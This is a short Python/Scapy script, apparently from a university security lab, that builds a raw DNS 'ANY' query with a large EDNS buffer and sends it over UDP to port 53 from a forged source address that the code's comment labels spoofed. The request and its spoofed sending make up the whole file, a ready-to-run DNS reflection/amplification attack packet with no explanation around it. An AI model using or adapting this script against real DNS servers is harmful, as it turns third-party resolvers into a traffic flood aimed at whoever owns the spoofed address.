from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNSQR, DNS
from pprint import pprint

from constant import *

results = []

payload = "4f2501200001000000000001126c6f75646c792d707572706c652d73656e6408736563757269747907757477656e7465026e6c0000ff00010000291000000000000000"

A = "10.0.0.3"  # spoofed source IP address
B = "10.0.0.2"  # destination IP address
C = 80  # source port
D = 53  # destination port

aux = payload.decode("hex")

spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / aux
send(spoofed_packet)
